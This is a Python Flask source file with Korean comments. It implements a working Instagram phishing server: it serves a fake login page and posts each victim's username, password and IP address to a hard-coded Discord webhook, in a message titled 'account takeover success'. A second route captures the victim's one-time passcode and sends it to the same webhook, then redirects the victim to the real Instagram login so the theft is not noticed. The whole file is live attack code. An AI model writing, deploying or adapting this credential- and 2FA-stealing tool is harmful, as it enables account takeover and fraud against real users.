from flask import Flask, render_template, request, redirect, url_for
import requests
import os

app = Flask(__name__)

# 당신의 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO17E_rE86GvK8vY-3D3S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0"

@app.route('/')
def index():
    # 윈도우/리눅스 경로 차이 없이 렌더링하도록 설정
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    # login.html의 name="username", name="password"와 일치시킴
    uid = request.form.get('username')
    pw = request.form.get('password')
    
    if uid and pw:
        payload = {
            "embeds": [{
                "title": "🚨 인스타그램 계정 탈취 성공",
                "color": 16711680,
                "fields": [
                    {"name": "ID", "value": f"`{uid}`", "inline": True},
                    {"name": "PW", "value": f"`{pw}`", "inline": True}
                ],
                "footer": {"text": f"IP: {request.remote_addr}"}
            }]
        }
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass
        
        # 정보를 뺏은 뒤 otp.html 렌더링
        return render_template('otp.html')
    
    return redirect(url_for('index'))

@app.route('/verify', methods=['POST'])
def verify():
    # [중요] otp.html의 name="otp_code"와 일치시킴
    auth_code = request.form.get('otp_code')
    
    if auth_code:
        # OTP 유출
        requests.post(WEBHOOK_URL, json={"content": f"🔑 **OTP 가로챔**: `{auth_code}`"})
        # 진짜 인스타로 리다이렉트
        return redirect("https://www.instagram.com/accounts/login/")
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    # Render 환경에 맞는 동적 포트 설정
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
